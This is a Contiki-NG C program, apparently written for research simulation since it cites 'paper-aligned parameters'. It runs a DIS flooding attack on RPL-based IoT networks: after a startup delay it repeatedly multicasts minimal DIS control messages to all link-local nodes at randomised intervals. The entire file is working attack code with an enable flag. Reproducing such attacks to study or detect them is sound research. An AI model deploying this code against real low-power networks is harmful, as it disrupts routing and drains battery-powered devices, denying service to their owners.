#include "contiki.h"
#include "lib/random.h"

#include "net/ipv6/uip.h"
#include "net/ipv6/uip-ds6.h"
#include "net/ipv6/uip-icmp6.h"

#include "sys/etimer.h"
#include "sys/clock.h"

#include <stdio.h>
#include <string.h>

/* -------------------------------------------------------------------------- */
/* Paper-aligned parameters                                                    */
/* -------------------------------------------------------------------------- */
#define ATTACK_START_DELAY   (75 * CLOCK_SECOND)
#define DIS_MIN_INTERVAL     (5 * CLOCK_SECOND)
#define DIS_MAX_INTERVAL     (60 * CLOCK_SECOND)

#ifndef DIS_ATTACK_ENABLED
#define DIS_ATTACK_ENABLED  1
#endif

/* ICMPv6 RPL control message */
#define ICMP6_RPL            155
#define ICMP6_RPL_CODE       0

/* RPL control message types (RFC 6550) */
#define RPL_CODE_DIS         0x00

PROCESS(dis_attacker_process, "DIS attacker");
AUTOSTART_PROCESSES(&dis_attacker_process);

/* Random interval in [min, max] */
static clock_time_t
random_interval(clock_time_t min, clock_time_t max)
{
  if(max <= min) return min;
  return min + (random_rand() % (max - min + 1));
}

/*
 * Send a minimal DIS message to all RPL nodes (IPv6 link-local all-nodes multicast).
 * Destination: ff02::1 (all nodes on link)
 */
static void
send_dis_broadcast(void)
{
  uip_ipaddr_t dest;

  /* ff02::1 (all nodes link-local multicast) */
  uip_create_linklocal_allnodes_mcast(&dest);

  /*
   * Prepare ICMPv6 payload in uip_appdata.
   * Minimal DIS: 1 byte => RPL message type = DIS (0x00)
   */
  uint8_t *payload = (uint8_t *)uip_appdata;
  payload[0] = RPL_CODE_DIS;

  /* Send ICMPv6 RPL (155), code 0, with 1-byte payload */
  uip_icmp6_send(&dest, ICMP6_RPL, ICMP6_RPL_CODE, 1);
}


PROCESS_THREAD(dis_attacker_process, ev, data)
{
  static struct etimer start_timer;
  static struct etimer attack_timer;

  PROCESS_BEGIN();

  printf("[DIS-ATTACK] Booted. Attack enabled=%d\n", DIS_ATTACK_ENABLED);

  /* wait until the network is stable */
  etimer_set(&start_timer, ATTACK_START_DELAY);
  PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&start_timer));

  printf("[DIS-ATTACK] Attack phase started\n");

  while(1) {
    if(DIS_ATTACK_ENABLED) {
      printf("[DIS-ATTACK] Sending DIS (ICMPv6 RPL)\n");
      send_dis_broadcast();
    }

    etimer_set(&attack_timer, random_interval(DIS_MIN_INTERVAL, DIS_MAX_INTERVAL));
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&attack_timer));
  }

  PROCESS_END();
}


